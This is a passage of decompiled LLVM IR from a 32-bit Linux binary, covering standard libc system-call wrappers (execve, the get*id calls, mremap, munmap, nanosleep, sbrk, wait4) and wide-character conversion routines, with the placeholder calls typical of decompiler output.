  %v8_80550f0 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80550f0 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80550f0, [1 x i8*] %v8_80550f0)
  store i32 %v9_80550f0, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80550f0, -4095
  br i1 %tmp12, label %dec_label_pc_8055108, label %dec_label_pc_80550fc

dec_label_pc_80550fc:                             ; preds = %entry
  %v1_80550fc = call i32 @__errno_location(i32 %v0_80550e8)
  %v0_8055101 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055101 = sub i32 0, %v0_8055101
  %v2_8055103 = inttoptr i32 %v1_80550fc to i32*
  store i32 %v1_8055101, i32* %v2_8055103, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055108

dec_label_pc_8055108:                             ; preds = %entry, %dec_label_pc_80550fc
  %v0_8055109 = phi i32 [ %v9_80550f0, %entry ], [ -1, %dec_label_pc_80550fc ]
  %v2_8055108 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055108, i32* @edx, align 4
  %v2_805510c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805510c, i32* %edi.global-to-local, align 4
  ret i32 %v0_8055109

; uselistorder directives
  uselistorder i32 %v9_80550f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055108, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055110 = load i32, i32* @ebx, align 4
  store i32 %v0_8055110, i32* %stack_var_-4, align 4
  %v1_8055119 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8055119, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055119, -4095
  br i1 %tmp, label %dec_label_pc_8055130, label %dec_label_pc_8055124

dec_label_pc_8055124:                             ; preds = %entry
  %v0_8055124 = load i32, i32* %stack_var_-4, align 4
  %v1_8055124 = call i32 @__errno_location(i32 %v0_8055124)
  %v0_8055129 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055129 = sub i32 0, %v0_8055129
  %v2_805512b = inttoptr i32 %v1_8055124 to i32*
  store i32 %v1_8055129, i32* %v2_805512b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055130

dec_label_pc_8055130:                             ; preds = %entry, %dec_label_pc_8055124
  %v0_8055131 = phi i32 [ %v1_8055119, %entry ], [ -1, %dec_label_pc_8055124 ]
  %v2_8055134 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055134, i32* @ebx, align 4
  ret i32 %v0_8055131

; uselistorder directives
  uselistorder i32 %v1_8055119, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_8055130, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055138 = load i32, i32* @ebx, align 4
  store i32 %v0_8055138, i32* %stack_var_-4, align 4
  %v1_8055141 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8055141, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055141, -4095
  br i1 %tmp, label %dec_label_pc_8055158, label %dec_label_pc_805514c

dec_label_pc_805514c:                             ; preds = %entry
  %v0_805514c = load i32, i32* %stack_var_-4, align 4
  %v1_805514c = call i32 @__errno_location(i32 %v0_805514c)
  %v0_8055151 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055151 = sub i32 0, %v0_8055151
  %v2_8055153 = inttoptr i32 %v1_805514c to i32*
  store i32 %v1_8055151, i32* %v2_8055153, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055158

dec_label_pc_8055158:                             ; preds = %entry, %dec_label_pc_805514c
  %v0_8055159 = phi i32 [ %v1_8055141, %entry ], [ -1, %dec_label_pc_805514c ]
  %v2_805515c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805515c, i32* @ebx, align 4
  ret i32 %v0_8055159

; uselistorder directives
  uselistorder i32 %v1_8055141, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_8055158, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055160 = load i32, i32* @ebx, align 4
  store i32 %v0_8055160, i32* %stack_var_-4, align 4
  %v1_8055169 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8055169, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055169, -4095
  br i1 %tmp, label %dec_label_pc_8055180, label %dec_label_pc_8055174

dec_label_pc_8055174:                             ; preds = %entry
  %v0_8055174 = load i32, i32* %stack_var_-4, align 4
  %v1_8055174 = call i32 @__errno_location(i32 %v0_8055174)
  %v0_8055179 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055179 = sub i32 0, %v0_8055179
  %v2_805517b = inttoptr i32 %v1_8055174 to i32*
  store i32 %v1_8055179, i32* %v2_805517b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055180

dec_label_pc_8055180:                             ; preds = %entry, %dec_label_pc_8055174
  %v0_8055181 = phi i32 [ %v1_8055169, %entry ], [ -1, %dec_label_pc_8055174 ]
  %v2_8055184 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055184, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055181

; uselistorder directives
  uselistorder i32 %v1_8055169, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055180, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055188 = load i32, i32* @ebx, align 4
  store i32 %v0_8055188, i32* %stack_var_-4, align 4
  %v1_8055191 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8055191, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055191, -4095
  br i1 %tmp, label %dec_label_pc_80551a8, label %dec_label_pc_805519c

dec_label_pc_805519c:                             ; preds = %entry
  %v0_805519c = load i32, i32* %stack_var_-4, align 4
  %v1_805519c = call i32 @__errno_location(i32 %v0_805519c)
  %v0_80551a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80551a1 = sub i32 0, %v0_80551a1
  %v2_80551a3 = inttoptr i32 %v1_805519c to i32*
  store i32 %v1_80551a1, i32* %v2_80551a3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80551a8

dec_label_pc_80551a8:                             ; preds = %entry, %dec_label_pc_805519c
  %v0_80551a9 = phi i32 [ %v1_8055191, %entry ], [ -1, %dec_label_pc_805519c ]
  %v2_80551ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80551ac, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80551a9

; uselistorder directives
  uselistorder i32 %v1_8055191, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_80551a8, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80551b0 = load i32, i32* @edi, align 4
  %v0_80551b1 = load i32, i32* @esi, align 4
  store i32 %v0_80551b1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80551c9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_80551d1 = call i32 @mremap(i32 %v0_80551c9, i32 %v0_80551b1, i32 %v0_80551b0, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_80551c9, i32* @ebx, align 4
  store i32 %v6_80551d1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_80551d1, -4095
  br i1 %tmp, label %dec_label_pc_80551e9, label %dec_label_pc_80551dd

dec_label_pc_80551dd:                             ; preds = %entry
  %v1_80551dd = call i32 @__errno_location(i32 %v0_80551c9)
  %v0_80551e2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80551e2 = sub i32 0, %v0_80551e2
  %v2_80551e4 = inttoptr i32 %v1_80551dd to i32*
  store i32 %v1_80551e2, i32* %v2_80551e4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80551e9

dec_label_pc_80551e9:                             ; preds = %entry, %dec_label_pc_80551dd
  %v0_80551ea = phi i32 [ %v6_80551d1, %entry ], [ -1, %dec_label_pc_80551dd ]
  %v2_80551e9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80551e9, i32* @edx, align 4
  %v2_80551ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80551ec, i32* @esi, align 4
  store i32 %v0_80551b0, i32* @edi, align 4
  ret i32 %v0_80551ea

; uselistorder directives
  uselistorder i32 %v6_80551d1, { 1, 0, 2 }
  uselistorder i32 %v0_80551c9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80551e9, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80551f0 = load i32, i32* @ebx, align 4
  store i32 %v0_80551f0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8055203 = call i32 @munmap(i32 %v0_80551f0, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8055203, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8055203, -4095
  br i1 %tmp, label %dec_label_pc_805521c, label %dec_label_pc_8055210

dec_label_pc_8055210:                             ; preds = %entry
  %v0_8055210 = load i32, i32* %stack_var_-4, align 4
  %v1_8055210 = call i32 @__errno_location(i32 %v0_8055210)
  %v0_8055215 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055215 = sub i32 0, %v0_8055215
  %v2_8055217 = inttoptr i32 %v1_8055210 to i32*
  store i32 %v1_8055215, i32* %v2_8055217, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805521c

dec_label_pc_805521c:                             ; preds = %entry, %dec_label_pc_8055210
  %v0_805521d = phi i32 [ %v4_8055203, %entry ], [ -1, %dec_label_pc_8055210 ]
  %v2_805521c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805521c, i32* @edx, align 4
  %v2_8055220 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055220, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805521d

; uselistorder directives
  uselistorder i32 %v4_8055203, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805521c, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055224 = load i32, i32* @ebx, align 4
  store i32 %v0_8055224, i32* %stack_var_-4, align 4
  %v4_8055228 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8055228, i32* %ebx.global-to-local, align 4
  %v6_8055237 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8055237, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8055237, -4095
  br i1 %tmp, label %dec_label_pc_8055250, label %dec_label_pc_8055244

dec_label_pc_8055244:                             ; preds = %entry
  %v0_8055244 = load i32, i32* %stack_var_-4, align 4
  %v1_8055244 = call i32 @__errno_location(i32 %v0_8055244)
  %v0_8055249 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055249 = sub i32 0, %v0_8055249
  %v2_805524b = inttoptr i32 %v1_8055244 to i32*
  store i32 %v1_8055249, i32* %v2_805524b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055250

dec_label_pc_8055250:                             ; preds = %entry, %dec_label_pc_8055244
  %v0_8055251 = phi i32 [ %v6_8055237, %entry ], [ -1, %dec_label_pc_8055244 ]
  %v2_8055250 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055250, i32* @edx, align 4
  %v2_8055254 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055254, i32* @ebx, align 4
  ret i32 %v0_8055251

; uselistorder directives
  uselistorder i32 %v6_8055237, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055250, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8055259 = load i32, i32* @ebx, align 4
  %v0_805525d = load i32, i32* @global_var_80617c4.540, align 4
  %v1_805525d = icmp eq i32 %v0_805525d, 0
  %v1_8055268 = icmp eq i1 %v1_805525d, false
  br i1 %v1_8055268, label %dec_label_pc_805527b, label %dec_label_pc_805526a

dec_label_pc_805526a:                             ; preds = %entry
  %v1_805526f = call i32 @__GI_brk(i32 0)
  %v2_8055277 = icmp slt i32 %v1_805526f, 0
  br i1 %v2_8055277, label %dec_label_pc_805529d, label %dec_label_pc_805526a.dec_label_pc_805527b_crit_edge

dec_label_pc_805526a.dec_label_pc_805527b_crit_edge: ; preds = %dec_label_pc_805526a
  %v0_805527d.pre = load i32, i32* @global_var_80617c4.540, align 4
  br label %dec_label_pc_805527b

dec_label_pc_805527b:                             ; preds = %dec_label_pc_805526a.dec_label_pc_805527b_crit_edge, %entry
  %v0_805528b = phi i32 [ %v0_805527d.pre, %dec_label_pc_805526a.dec_label_pc_805527b_crit_edge ], [ %v0_805525d, %entry ]
  %v1_805527b = icmp eq i32 %arg1, 0
  %v1_8055282 = icmp eq i1 %v1_805527b, false
  br i1 %v1_8055282, label %dec_label_pc_8055288, label %dec_label_pc_8055284

dec_label_pc_8055284:                             ; preds = %dec_label_pc_805527b
  br label %dec_label_pc_80552a0

dec_label_pc_8055288:                             ; preds = %dec_label_pc_805527b
  store i32 %v0_805528b, i32* @ebx, align 4
  %v2_805528d = add i32 %v0_805528b, %arg1
  %v1_8055291 = call i32 @__GI_brk(i32 %v2_805528d)
  %v2_8055299 = icmp slt i32 %v1_8055291, 0
  %v1_805529b = icmp eq i1 %v2_8055299, false
  br i1 %v1_805529b, label %dec_label_pc_8055288.dec_label_pc_80552a0_crit_edge, label %dec_label_pc_805529d

dec_label_pc_8055288.dec_label_pc_80552a0_crit_edge: ; preds = %dec_label_pc_8055288
  %v0_80552a1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80552a0

dec_label_pc_805529d:                             ; preds = %dec_label_pc_8055288, %dec_label_pc_805526a
  br label %dec_label_pc_80552a0

dec_label_pc_80552a0:                             ; preds = %dec_label_pc_8055288.dec_label_pc_80552a0_crit_edge, %dec_label_pc_8055284, %dec_label_pc_805529d
  %v0_80552a1 = phi i32 [ %v0_80552a1.pre, %dec_label_pc_8055288.dec_label_pc_80552a0_crit_edge ], [ %v0_805528b, %dec_label_pc_8055284 ], [ -1, %dec_label_pc_805529d ]
  %v2_80552a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80552a0, i32* @edx, align 4
  store i32 %v0_8055259, i32* @ebx, align 4
  ret i32 %v0_80552a1

; uselistorder directives
  uselistorder i32 %v0_805528b, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80552a0, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80552a8 = load i32, i32* @edi, align 4
  %v0_80552a9 = load i32, i32* @esi, align 4
  store i32 %v0_80552a9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_80552bd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80552c5 = call i32 @wait4(i32 %v0_80552bd, i32 %v0_80552a9, i32 %v0_80552a8, i32 %tmp5)
  store i32 %v0_80552bd, i32* @ebx, align 4
  store i32 %v4_80552c5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80552c5, -4095
  br i1 %tmp, label %dec_label_pc_80552dd, label %dec_label_pc_80552d1

dec_label_pc_80552d1:                             ; preds = %entry
  %v1_80552d1 = call i32 @__errno_location(i32 %v0_80552bd)
  %v0_80552d6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552d6 = sub i32 0, %v0_80552d6
  %v2_80552d8 = inttoptr i32 %v1_80552d1 to i32*
  store i32 %v1_80552d6, i32* %v2_80552d8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80552dd

dec_label_pc_80552dd:                             ; preds = %entry, %dec_label_pc_80552d1
  %v0_80552de = phi i32 [ %v4_80552c5, %entry ], [ -1, %dec_label_pc_80552d1 ]
  %v2_80552e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80552e0, i32* @esi, align 4
  store i32 %v0_80552a8, i32* @edi, align 4
  ret i32 %v0_80552de

; uselistorder directives
  uselistorder i32 %v4_80552c5, { 1, 0, 2 }
  uselistorder i32 %v0_80552bd, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80552dd, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80617a4.541 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_80552f7 = icmp eq i32 %tmp4, 0
  %v1_80552f9 = icmp eq i1 %v1_80552f7, false
  br i1 %v1_80552f9, label %dec_label_pc_8055301, label %dec_label_pc_80552fb

dec_label_pc_80552fb:                             ; preds = %entry
  %v2_80552fb = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8055301

dec_label_pc_8055301:                             ; preds = %entry, %dec_label_pc_80552fb
  %v0_805531d = phi i32 [ %tmp4, %entry ], [ %v2_80552fb, %dec_label_pc_80552fb ]
  %v0_8055309 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_80552fb ]
  %v2_8055301 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8055301, i32* %stack_var_-8, align 4
  store i32 %v0_8055309, i32* %stack_var_-4, align 4
  %v2_8055318 = ptrtoint i32* %stack_var_-8 to i32
  %v5_805531e = inttoptr i32 %v0_805531d to i8*
  %v6_805531e = call i32 @__GI_wcsnrtombs(i8* %v5_805531e, i32 %v2_8055318, i32 1, i32 16, i32 %tmp)
  %v1_8055328 = icmp eq i32 %v6_805531e, 0
  %v3_805532a = select i1 %v1_8055328, i32 1, i32 %v6_805531e
  ret i32 %v3_805532a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8055301, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8055349 = inttoptr i32 %tmp to i8*
  %v6_8055349 = call i32 @__GI_wcsnrtombs(i8* %v5_8055349, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8055349
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_8055357 = load i32, i32* @ebx, align 4
  %v4_805535b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805535b, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_805536b = icmp eq i8* %arg1, null
  store i1 %v1_805536b, i1* %zf.global-to-local, align 1
  br i1 %v1_805536b, label %dec_label_pc_805537a, label %dec_label_pc_805536f

dec_label_pc_805536f:                             ; preds = %entry
  %v12_805536f = icmp eq i32 %v4_805535b, %arg2
  store i1 %v12_805536f, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8055376 = icmp eq i1 %v12_805536f, false
  br i1 %v1_8055376, label %dec_label_pc_805539d, label %dec_label_pc_8055397

dec_label_pc_805537a:                             ; preds = %entry
  %v2_805537a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805537a, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805539b

dec_label_pc_8055383:                             ; preds = %dec_label_pc_80553ab
  %v1_8055383 = call i32 @__errno_location(i32 %v0_8055357)
  %v1_8055388 = inttoptr i32 %v1_8055383 to i32*
  store i32 84, i32* %v1_8055388, align 4
  br label %dec_label_pc_80553d1

dec_label_pc_8055393:                             ; preds = %dec_label_pc_80553b2
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80553c6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80553c2

dec_label_pc_8055397:                             ; preds = %dec_label_pc_805536f
  %v2_8055397 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055397, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805539b

dec_label_pc_805539b:                             ; preds = %dec_label_pc_805537a, %dec_label_pc_8055397
  %v2_80553b416 = phi i32 [ %v2_805537a, %dec_label_pc_805537a ], [ %v2_8055397, %dec_label_pc_8055397 ]
  %v1_80553a012 = phi i32 [ -1, %dec_label_pc_805537a ], [ %arg4, %dec_label_pc_8055397 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805539d

dec_label_pc_805539d:                             ; preds = %dec_label_pc_805536f, %dec_label_pc_805539b
  %v2_80553b415 = phi i32 [ %v4_805535b, %dec_label_pc_805536f ], [ %v2_80553b416, %dec_label_pc_805539b ]
  %v0_80553a2 = phi i32 [ %arg4, %dec_label_pc_805536f ], [ %v1_80553a012, %dec_label_pc_805539b ]
  %v1_805539d = inttoptr i32 %arg2 to i32*
  %v2_805539d = load i32, i32* %v1_805539d, align 4
  store i32 %v2_805539d, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_80553a2, %arg3
  %v5_80553a4 = select i1 %tmp31, i32 %arg3, i32 %v0_80553a2
  store i32 %v5_80553a4, i32* %edi.global-to-local, align 4
  store i32 %v5_80553a4, i32* @ecx, align 4
  %v1_80553be3 = icmp eq i32 %v5_80553a4, 0
  store i1 %v1_80553be3, i1* %zf.global-to-local, align 1
  %v1_80553c010 = icmp eq i1 %v1_80553be3, false
  br i1 %v1_80553c010, label %dec_label_pc_80553ab, label %dec_label_pc_80553c2

dec_label_pc_80553ab:                             ; preds = %dec_label_pc_805539d, %dec_label_pc_80553b8
  %v2_80553b4 = phi i32 [ %v2_80553bb, %dec_label_pc_80553b8 ], [ %v2_80553b415, %dec_label_pc_805539d ]
  %v0_80553ab = phi i32 [ %v1_80553b8, %dec_label_pc_80553b8 ], [ %v2_805539d, %dec_label_pc_805539d ]
  %v1_80553ab = inttoptr i32 %v0_80553ab to i32*
  %v2_80553ab = load i32, i32* %v1_80553ab, align 4
  %v9_80553ad = icmp eq i32 %v2_80553ab, 127
  store i1 %v9_80553ad, i1* %zf.global-to-local, align 1
  %v6_80553b0 = icmp ugt i32 %v2_80553ab, 127
  br i1 %v6_80553b0, label %dec_label_pc_8055383, label %dec_label_pc_80553b2

dec_label_pc_80553b2:                             ; preds = %dec_label_pc_80553ab
  %v3_80553b2 = trunc i32 %v2_80553ab to i8
  %v4_80553b2 = icmp eq i8 %v3_80553b2, 0
  store i1 %v4_80553b2, i1* %zf.global-to-local, align 1
  %v3_80553b4 = inttoptr i32 %v2_80553b4 to i8*
  store i8 %v3_80553b2, i8* %v3_80553b4, align 1
  %v0_80553b6 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80553b6, label %dec_label_pc_8055393, label %dec_label_pc_80553b8

dec_label_pc_80553b8:                             ; preds = %dec_label_pc_80553b2
  %v0_80553b8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80553b8 = add i32 %v0_80553b8, 4
  store i32 %v1_80553b8, i32* %ebx.global-to-local, align 4
  %v0_80553bb = load i32, i32* %edx.global-to-local, align 4
  %v1_80553bb = load i32, i32* %esi.global-to-local, align 4
  %v2_80553bb = add i32 %v1_80553bb, %v0_80553bb
  store i32 %v2_80553bb, i32* %edx.global-to-local, align 4
  %v0_80553bd = load i32, i32* @ecx, align 4
  %v1_80553bd = add i32 %v0_80553bd, -1
  %v8_80553bd = icmp eq i32 %v1_80553bd, 0
  store i32 %v1_80553bd, i32* @ecx, align 4
  store i1 %v8_80553bd, i1* %zf.global-to-local, align 1
  %v1_80553c0 = icmp eq i1 %v8_80553bd, false
  br i1 %v1_80553c0, label %dec_label_pc_80553ab, label %dec_label_pc_80553c2

dec_label_pc_80553c2:                             ; preds = %dec_label_pc_80553b8, %dec_label_pc_805539d, %dec_label_pc_8055393
  %v0_80553ca = phi i32 [ 0, %dec_label_pc_8055393 ], [ %v2_805539d, %dec_label_pc_805539d ], [ %v1_80553b8, %dec_label_pc_80553b8 ]
  %v0_80553c6 = phi i32 [ %v0_80553c6.pre, %dec_label_pc_8055393 ], [ %v2_80553b415, %dec_label_pc_805539d ], [ %v2_80553bb, %dec_label_pc_80553b8 ]
  %v2_80553c2 = ptrtoint i32* %stack_var_-32 to i32
  %v12_80553c6 = icmp eq i32 %v0_80553c6, %v2_80553c2
  store i1 %v12_80553c6, i1* %zf.global-to-local, align 1
  br i1 %v12_80553c6, label %dec_label_pc_80553cd, label %dec_label_pc_80553ca

dec_label_pc_80553ca:                             ; preds = %dec_label_pc_80553c2
  %v1_80553ca = load i32, i32* %ebp.global-to-local, align 4
  %v2_80553ca = inttoptr i32 %v1_80553ca to i32*
  store i32 %v0_80553ca, i32* %v2_80553ca, align 4
  br label %dec_label_pc_80553cd

dec_label_pc_80553cd:                             ; preds = %dec_label_pc_80553c2, %dec_label_pc_80553ca
  %v0_80553cd = load i32, i32* %edi.global-to-local, align 4
  %v1_80553cf = load i32, i32* @ecx, align 4
  %v2_80553cf = sub i32 %v0_80553cd, %v1_80553cf
  %v12_80553cf = icmp eq i32 %v2_80553cf, 0
  br label %dec_label_pc_80553d1

dec_label_pc_80553d1:                             ; preds = %dec_label_pc_8055383, %dec_label_pc_80553cd
  %storemerge = phi i1 [ %v12_80553cf, %dec_label_pc_80553cd ], [ false, %dec_label_pc_8055383 ]
  %storemerge1 = phi i32 [ %v2_80553cf, %dec_label_pc_80553cd ], [ -1, %dec_label_pc_8055383 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_80553d1 = load i32, i32* @esp, align 4
  %v9_80553d1 = icmp eq i32 %v0_80553d1, -28
  store i1 %v9_80553d1, i1* %zf.global-to-local, align 1
  store i32 %v0_8055357, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_80553c6, { 1, 0 }
  uselistorder i32 %v2_80553bb, { 0, 2, 1 }
  uselistorder i32 %v1_80553b8, { 0, 2, 1 }
  uselistorder i32 %v2_80553ab, { 1, 2, 0 }
  uselistorder i32 %v2_805539d, { 1, 0, 2 }
  uselistorder i32 %v0_80553a2, { 1, 0 }
  uselistorder i32 %v2_80553b415, { 1, 0 }
  uselistorder i1 %v12_805536f, { 1, 0 }
  uselistorder i32 %v4_805535b, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 11, 1, 6, 3, 4, 5, 12, 7, 2, 8, 9, 10 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
